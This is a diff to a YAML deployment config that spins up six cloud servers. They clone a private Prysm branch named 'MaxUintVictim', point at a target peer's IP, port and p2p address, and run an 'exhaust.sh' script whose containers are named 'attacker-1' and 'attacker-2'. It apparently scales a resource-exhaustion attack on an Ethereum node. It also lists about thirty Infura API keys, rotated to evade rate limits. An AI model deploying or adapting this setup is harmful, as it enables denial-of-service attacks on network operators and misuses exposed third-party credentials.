@@ -1,10 +1,10 @@
 
 general:
   # Amount of servers to create
-  servers: 1
+  servers: 6
   # Good choices are (depending on the power required): cx11, cx21, cx31, cx41
   # More - https://www.hetzner.com/cloud
-  server_type: "cx11"
+  server_type: "cx41"
   # Hetzner.com token (https://docs.hetzner.cloud/#authentication)
   token: null
   # Second to wait for servers' initialization
@@ -14,6 +14,52 @@ general:
   # mullvad:
   #   account: null
 
+vars:
+  # List of tokens to use for goerli network. *One per server is used*!
+  # Comment out when rate limited
+  goerli:
+    - "https://goerli.infura.io/v3/8888a0ca159247cf98f3ad830b246319"
+    - "https://goerli.infura.io/v3/9f4fd6b1726f4bcb91540adcf11b71ab"
+    - "https://goerli.infura.io/v3/d78b2835f8b14b82a14763096ca24f9d"
+    - "https://goerli.infura.io/v3/9af95db105024945b1fb35ccd3683008"
+    - "https://goerli.infura.io/v3/3527865c4d8d4c6a93dccc0d86e01ac4"
+    # ^5
+    - "https://goerli.infura.io/v3/79ec6599d36c461bbaa8ffc2bf622e6b"
+    - "https://goerli.infura.io/v3/11dc0215d8784ee489341d861bfd4bfb"
+    - "https://goerli.infura.io/v3/eeee756382bf4ecd93570ad3fd79e555"
+    - "https://goerli.infura.io/v3/7d4e981c2fe44ad2ac53d1f1d13d59e6"
+    - "https://goerli.infura.io/v3/2fd6305d2033417588ad325e0e848967"
+    # ^10
+    - "https://goerli.infura.io/v3/4292fec72f954db592183b3dd6ddf93c"
+    - "https://goerli.infura.io/v3/474f9fd773b94e5f841f7d46cf3c732d"
+    - "https://goerli.infura.io/v3/c4dd75d1f2294acc93992ebe2f53eb15"
+    - "https://goerli.infura.io/v3/129503947b454a0b8de93f9c4d2cf61a"
+    - "https://goerli.infura.io/v3/38d44329f53c42a59f4bd3ba2db87743"
+    # ^15
+    - "https://goerli.infura.io/v3/4298f9d144294e249923c91d062ba4ff"
+    - "https://goerli.infura.io/v3/5be87b3079b4416091fece4423ba1046"
+    - "https://goerli.infura.io/v3/8ac61b62654b4b09999db9f76c581ddb"
+    - "https://goerli.infura.io/v3/b8adffe729c04d27bfeba8b7d601e172"
+    - "https://goerli.infura.io/v3/05305ed568ac465984162345346a2d24"
+    # ^20
+    - "https://goerli.infura.io/v3/1de269d577124007b78a350ff7acc3e1"
+    - "https://goerli.infura.io/v3/1671a5a02569420c853af2f3396f9f69"
+    - "https://goerli.infura.io/v3/6f29200d71b94970970a54dd6facd7eb"
+    - "https://goerli.infura.io/v3/4fbb27c1848640b2a35529fdcf393c4f"
+    - "https://goerli.infura.io/v3/bba82fd9ce094a7c8f6b6d2996502970"
+    # ^25
+    - "https://goerli.infura.io/v3/4b266a58955a43c6adc37632b8b58591"
+    - "https://goerli.infura.io/v3/ae1e423fdb28404ba68d41527ded8e40"
+    - "https://goerli.infura.io/v3/b3ff17df5b8744af8aeaf040f038e8ac"
+    - "https://goerli.infura.io/v3/666bda864b374e50af4c97ba72dcdb17"
+    - "https://goerli.infura.io/v3/bfe394f6a3874bf3a54d6d8c36b83985"
+    # ^30
+    - "https://goerli.infura.io/v3/"
+    - "https://goerli.infura.io/v3/"
+    - "https://goerli.infura.io/v3/"
+    - "https://goerli.infura.io/v3/"
+    - "https://goerli.infura.io/v3/"
+
 commands:
   # Dependencies
   - command: "apt-get update && apt-get upgrade -qq -y && apt-get install -qq -y docker.io golang git curl gnupg g++ unzip zip libncurses5 libgmp-dev libssl-dev"
@@ -22,7 +68,7 @@ commands:
   - "mkdir -p /usr/local/lib/bazel/bin"
   - "cd /usr/local/lib/bazel/bin && curl -fsSLO https://releases.bazel.build/3.7.0/release/bazel-3.7.0-linux-x86_64 && chmod +x bazel-3.7.0-linux-x86_64 && cd /root"
   - "ln -s /usr/local/lib/bazel/bin/bazel-3.7.0-linux-x86_64 /usr/bin/bazel"
-  # Clone the project
+  # Clone the project, need to use username/password for private repo
   - command: "git clone --depth 1 --branch \"MaxUintVictim\" https://{username}:{password}@github.com/org404/prysm.git"
     username: null
     password: null
@@ -30,16 +76,18 @@ commands:
   # Set target
   - command: "export TARGET=/ip4/{target_ip}/tcp/{target_port}/p2p/{target_addr}"
     target_ip: null
-    target_port: null
+    target_port: 13000
     target_addr: null
+  # Set goerli url (one per container)
+  - command: "export GOERLI_URL={it}"
+    use: "goerli"  # this will put values provided in "vars.goerli" section into "it" variable inside string
   # Set amount of instances to spin up
   - "export N=5"
   - "chmod +x exhaust.sh"
   - "./exhaust.sh"
-  # Report message. "index" is a builtin var that any message has access to.
+  # Report message. Server "index" is a builtin var that any message has access to.
   - command: "echo \"[Server #{index}] (ipv4='$(curl -s -4 ifconfig.io)', ipv6='$(curl -s -6 ifconfig.io)') finished deployement.\""
-    # Shows output
-    show: True
+    show: True  # Show output, off by default
 
 assertions:
   # Sanity check, we look for 'exhaust.sh' in a cloned project
@@ -48,7 +96,7 @@ assertions:
     # show: True  # Off by default
   # Check if attackers are running
   - command: "docker ps"
-    # [DEBUG] show: True
+    # show: True  # Off by default
     contains: "attacker-1"
   - command: "docker ps"
     contains: "attacker-2"
